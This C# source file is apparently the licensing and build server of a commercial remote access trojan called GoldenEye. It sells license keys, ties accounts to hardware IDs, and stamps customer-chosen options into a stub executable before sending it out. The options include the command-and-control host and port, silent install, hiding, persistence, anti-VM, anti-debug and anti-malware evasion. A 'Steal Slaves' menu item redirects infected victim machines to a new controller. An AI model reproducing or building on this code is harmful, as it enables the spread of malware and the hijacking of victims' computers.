using Microsoft.VisualBasic;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace GoldenEye_Licensing_Server
{
    public partial class Form1 : Form
    {
        private Thread listenerThread;
        private TcpListener listener;
        private int online = 0;

        public Form1()
        {
            InitializeComponent();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            Environment.Exit(0);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            listener = new TcpListener(IPAddress.Any, 9008);
            listenerThread = new Thread(Listen);
            listenerThread.Start();
            Directory.CreateDirectory("Clients");
            Directory.CreateDirectory("Valid Keys");
            Directory.CreateDirectory("Banned Clients");
        }

        private void Listen()
        {
            listener.Start();
            while (true)
            {
                Connection clientConnection = new Connection(listener.AcceptTcpClient());
                clientConnection.DisconnectedEvent += new Connection.Disconnected(clientConnection_DisconnectedEvent);
                clientConnection.ReceivedEvent += new Connection.Received(clientConnection_ReceivedEvent);
            }
        }

        private void clientConnection_ReceivedEvent(Connection client, String Message)
        {
            string[] cut = Message.Split('|');
            switch (cut[0])
            {
                case "REQLOGIN":
                    Invoke(new _AddClient(AddClient), client, cut[1], cut[2], cut[3], cut[4], cut[5]);
                    break;

                case "REQREGISTER":
                    Invoke(new _requestRegistration(requestRegistration), client, cut[1], cut[2], cut[3], cut[4], cut[5]);
                    break;

                case "REQBUILD":
                    Invoke(new _requestFileBuild(requestFileBuild), client, cut[1], cut[2], cut[3], cut[4], cut[5]);
                    break;

                case "ASKUPDATE":

                    break;
            }
        }

        private void clientConnection_DisconnectedEvent(Connection client)
        {
            Invoke(new _RemoveClient(RemoveClient), client);
        }

        public static string GetRandomString()
        {
            string path = Path.GetRandomFileName();
            path = path.Replace(".", ""); // Remove period.
            return path;
        }

        #region <Invoking>

        private delegate void _checkupdate(Connection client, String ver);

        private void checkUpdate(Connection client, String ver)
        {
            if (!ver.Equals(t_TextBox9.Text))
            {
                client.Send("RECVUPD" + "|" + t_TextBox9.Text + "|" + t_TextBox9.Text);
            }
        }

        private delegate void _requestFileBuild(Connection client, String path, String User, String Pass, String hwid, String options);

        private void requestFileBuild(Connection client, String path, String User, String Pass, String hwid, String options)
        {
            bool isOk = false;

            if (Directory.Exists(Application.StartupPath + @"\Clients\" + User))
            {
                string pwsav = File.ReadAllText(Application.StartupPath + @"\Clients\" + User + @"\password.txt");
                if (pwsav.Equals(Pass))
                {
                    string hwidsav = File.ReadAllText(Application.StartupPath + @"\Clients\" + User + @"\hwid.txt");
                    if (hwidsav.Equals(hwid))
                    {
                        if (!File.Exists(Application.StartupPath + @"\Banned Clients\" + hwid + @".txt") || !File.Exists(Application.StartupPath + @"\Banned Clients\" + User + @".txt"))
                        {
                            isOk = true;
                        }
                        else
                        {
                            string banreason = File.ReadAllText(Application.StartupPath + @"\Banned Clients\" + hwid + @".txt");
                            client.Send("NOACC" + "|" + "Your Account has been banned! Reason: " + banreason);
                        }
                    }
                    else
                    {
                        isOk = false;
                    }
                }
                else
                {
                    isOk = false;
                }
            }
            else
            {
                isOk = false;
            }

            if (isOk == true)
            {
                File.Copy(Application.StartupPath + @"\Stub.exe", hwid + ".exe", true);
                string filepath = Application.StartupPath + @"\" + hwid + ".exe";

                string[] optionas = options.Split('³');

                foreach (string option in optionas)
                {
                    if (option.Split('²')[0].Equals("clientID"))
                    {
                        NativeResource.WriteResource(filepath, "CLIENTID", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                     
                    }
                    else if (option.Split('²')[0].Equals("DNSIP"))
                    {
                        NativeResource.WriteResource(filepath, "DNSIP", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("PORT"))
                    {
                        NativeResource.WriteResource(filepath, "PORT", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("INSTALL"))
                    {
                        NativeResource.WriteResource(filepath, "INSTALL", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                        NativeResource.WriteResource(filepath, "INSTALLFOLDER", AES_Encrypt(option.Split('²')[2], User + "-" + hwid));
                        NativeResource.WriteResource(filepath, "INSTALLFILE", AES_Encrypt(option.Split('²')[3], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("SILENT"))
                    {
                        NativeResource.WriteResource(filepath, "SILENT", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("HIDE"))
                    {
                        NativeResource.WriteResource(filepath, "HIDE", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("BINARYPERSIST"))
                    {
                        NativeResource.WriteResource(filepath, "BINARYPERSIST", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("PROCPERSIST"))
                    {
                        NativeResource.WriteResource(filepath, "PROCPERSIST", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("PROACTIVEANTIM"))
                    {
                        NativeResource.WriteResource(filepath, "PROACTIVEANTIM", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("ANTIVM"))
                    {
                        NativeResource.WriteResource(filepath, "ANTIVM", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("ANTIDEBUG"))
                    {
                        NativeResource.WriteResource(filepath, "ANTIDEBUG", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("ANTIDLL"))
                    {
                        NativeResource.WriteResource(filepath, "ANTIDLL", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                    else if (option.Split('²')[0].Equals("SYSPROC"))
                    {
                        NativeResource.WriteResource(filepath, "SYSPROC", AES_Encrypt(option.Split('²')[1], User + "-" + hwid));
                    }
                }
                NativeResource.WriteResource(filepath, "CRYPTKEY", User + "-" + hwid);
                client.Send("RECVBUILD|" + path + "|" + Convert.ToBase64String(File.ReadAllBytes(filepath)));
                try
                {
                    File.Delete(filepath);
                }
                catch { }
            }
            else
            {
                client.Send("NOACC" + "|" + "Failed to verify your license at Building Server.");
            }
        }

        private delegate void _requestRegistration(Connection client, String Username, String Password, String HWID, String LicenseKeyProvided, String ratver);

        private void requestRegistration(Connection client, String Username, String Password, String HWID, String LicenseKeyProvided, String ratver)
        {
            if (ratver.Equals(t_TextBox9.Text))
            { }
            else
            {
                client.Send("RECVUPD|" + t_TextBox9.Text + "|" + t_TextBox10.Text);
                return;
            }
            DirectoryInfo d = new DirectoryInfo(Application.StartupPath + @"\Valid Keys\");

            bool found = false;
            foreach (var file in d.GetFiles("*.key"))
            {
                if (file.Name.Equals(LicenseKeyProvided + ".key"))
                {
                    if (!Directory.Exists(Application.StartupPath + @"\Clients\" + Username))
                    {
                        Directory.CreateDirectory(Application.StartupPath + @"\Clients\" + Username);
                        File.WriteAllText(Application.StartupPath + @"\Clients\" + Username + @"\password.txt", Password);
                        File.WriteAllText(Application.StartupPath + @"\Clients\" + Username + @"\hwid.txt", HWID);
                        File.Delete(file.FullName);
                        found = true;
                    }
                    else
                    {
                        client.Send("NOACC" + "|" + "This Username is already in use!");
                    }
                }
            }
            if (found == true)
            {
                client.Send("REGOK|");
            }
            else
            {
                client.Send("NOACC" + "|" + "Your provided License Key is invalid!");
            }
        }

        private delegate void _AddClient(Connection client, String Username, String Password, String HWID, String ClientsOnline, String ratver);

        private void AddClient(Connection client, String Username, String Password, String HWID, String ClientsOnline, String ratver)
        {
            // Username | IP Address | Hardware ID | Clients Online
            if (ratver.Equals(t_TextBox9.Text))
            { }
            else
            {
                client.Send("RECVUPD|" + t_TextBox9.Text + "|" + t_TextBox10.Text);
                return;
            }
            ListViewItem item = new ListViewItem();
            item.Text = Username;
            item.SubItems.Add(client.IPAddress);
            item.SubItems.Add(HWID);
            item.SubItems.Add(ClientsOnline);
            item.Tag = client;
            online++;
            listView1.Items.Add(item);
            updateOnline();

            if (Directory.Exists(Application.StartupPath + @"\Clients\" + Username))
            {
                try
                {
                    string pwsav = File.ReadAllText(Application.StartupPath + @"\Clients\" + Username + @"\password.txt");
                    if (pwsav.Equals(Password))
                    {
                        string hwidsav = File.ReadAllText(Application.StartupPath + @"\Clients\" + Username + @"\hwid.txt");
                        if (hwidsav.Equals(HWID))
                        {
                            if (!File.Exists(Application.StartupPath + @"\Banned Clients\" + HWID + @".txt") || !File.Exists(Application.StartupPath + @"\Banned Clients\" + Username + @".txt"))
                            {
                                client.Send("GRAND");
                            }
                            else
                            {
                                string banreason = File.ReadAllText(Application.StartupPath + @"\Banned Clients\" + HWID + @".txt");
                                client.Send("NOACC" + "|" + "Your Account has been banned! Reason: " + banreason);
                            }
                        }
                        else
                        {
                            client.Send("NOACC" + "|" + "Your Account has been registered on this Computer! (Wrong HWID)");
                        }
                    }
                    else
                    {
                        client.Send("NOACC" + "|" + "You have entered the wrong Password!");
                    }
                }
                catch
                {
                    client.Send("NOACC" + "|" + "There was a error while requesting your Password from our Database!");
                }
            }
            else
            {
                client.Send("NOACC" + "|" + "There is no Username called '" + Username + "'!");
            }
            // client.Send("NOACC" + "|" + "This is a ERROR Message!");
        }

        private delegate void _RemoveClient(Connection client);

        private void RemoveClient(Connection client)
        {
            foreach (ListViewItem i in listView1.Items)
                if ((Connection)i.Tag == client)
                {
                    i.Remove();
                    online--;
                    updateOnline();
                    break;
                }
        }

        private void updateOnline()
        {
            // lblOnline.Text = "Online: " + online;
        }

        #endregion <Invoking>

        private void velyseButton1_Click(object sender, EventArgs e)
        {
            int counter = 0;
            string copylater = string.Empty;
            while (counter < velyseNumericButton1.Value)
            {
                string newrdm = RandomString(4) + "-" + RandomString(4) + "-" + RandomString(4) + "-" + RandomString(4);

                File.WriteAllText(Application.StartupPath + @"\Valid Keys\" + newrdm + ".key", "x");
                copylater += newrdm + Environment.NewLine;
                counter++;
            }
            Clipboard.SetText(copylater);
            MessageBox.Show("The generated Keys has been copied to Clipboard!");
        }

        private Random rand = new Random();

        public const string Alphabet =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        public string RandomString(int size)
        {
            char[] chars = new char[size];
            for (int i = 0; i < size; i++)
            {
                chars[i] = Alphabet[rand.Next(Alphabet.Length)];
            }
            return new string(chars);
            
        }
        public string AES_Encrypt(string input, string pass)
        {
            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
            System.Security.Cryptography.MD5CryptoServiceProvider Hash_AES = new System.Security.Cryptography.MD5CryptoServiceProvider();
            string encrypted = "";
            try
            {
                byte[] hash = new byte[32];
                byte[] temp = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass));
                Array.Copy(temp, 0, hash, 0, 16);
                Array.Copy(temp, 0, hash, 15, 16);
                AES.Key = hash;
                AES.Mode = System.Security.Cryptography.CipherMode.ECB;
                System.Security.Cryptography.ICryptoTransform DESEncrypter = AES.CreateEncryptor();
                byte[] Buffer = System.Text.ASCIIEncoding.ASCII.GetBytes(input);
                encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length));
                return encrypted;
            }
            catch (Exception ex)
            {
                return "ERROR";
            }
        }
        private void velyseButton2_Click(object sender, EventArgs e)
        {
            Directory.CreateDirectory(Application.StartupPath + @"\Clients\" + t_TextBox1.Text);
            File.WriteAllText(Application.StartupPath + @"\Clients\" + t_TextBox1.Text + @"\password.txt", t_TextBox2.Text);
            File.WriteAllText(Application.StartupPath + @"\Clients\" + t_TextBox1.Text + @"\hwid.txt", t_TextBox3.Text);
            MessageBox.Show("Successfully created User: " + t_TextBox1.Text + "!");
        }

        private void velyseButton3_Click(object sender, EventArgs e)
        {
            File.WriteAllText(Application.StartupPath + @"\Banned Clients\" + t_TextBox4.Text + @".txt", t_TextBox5.Text);
            MessageBox.Show("The Hardware ID has been banned.");
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[2].Text.Equals(t_TextBox4.Text))
                {
                    Connection client = (Connection)item.Tag;
                    client.Send("NOACC" + "|" + "Your Hadware ID has been banned. Reason: " + t_TextBox5.Text);
                }
            }
        }

        private void disconnectUserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                client.Send("NOACC" + "|" + "You has been disconnected by License Server!");
            }
        }

        private void hardwareIDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not select more than one User");
                return;
            }

            Clipboard.SetText(listView1.SelectedItems[0].SubItems[2].Text);
        }

        private void velyseButton4_Click(object sender, EventArgs e)
        {
            File.WriteAllText(Application.StartupPath + @"\Banned Clients\" + t_TextBox6.Text + @".txt", t_TextBox7.Text);
            MessageBox.Show("The Hardware ID has been banned.");
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.SubItems[2].Text.Equals(t_TextBox6.Text))
                {
                    Connection client = (Connection)item.Tag;
                    client.Send("NOACC" + "|" + "Your Hadware ID has been banned. Reason: " + t_TextBox5.Text);
                }
            }
        }

        private void velyseButton3_Click_1(object sender, EventArgs e)
        {
            File.WriteAllText(Application.StartupPath + @"\Banned Clients\" + t_TextBox5.Text + @".txt", t_TextBox4.Text);
            MessageBox.Show("The Hardware ID has been banned.");
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text.Equals(t_TextBox5.Text))
                {
                    Connection client = (Connection)item.Tag;
                    client.Send("NOACC" + "|" + "Your Account has been banned. Reason: " + t_TextBox4.Text);
                }
            }
        }

        private void velyseButton5_Click(object sender, EventArgs e)
        {
            string Username = t_TextBox8.Text;
            try
            {
                Directory.Delete(Application.StartupPath + @"\Clients\" + Username);
            }
            catch (Exception eax)
            {
                Directory.Delete(Application.StartupPath + @"\Clients\" + Username, true);
            }
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }

        private void stealSlavesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string newIP = Interaction.InputBox("Enter a new IP/DNS to update the Slaves to", "Steal Slaves", "", 0, 0);

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;

                client.Send("UTDP|" + newIP);
            }
        }
    }
}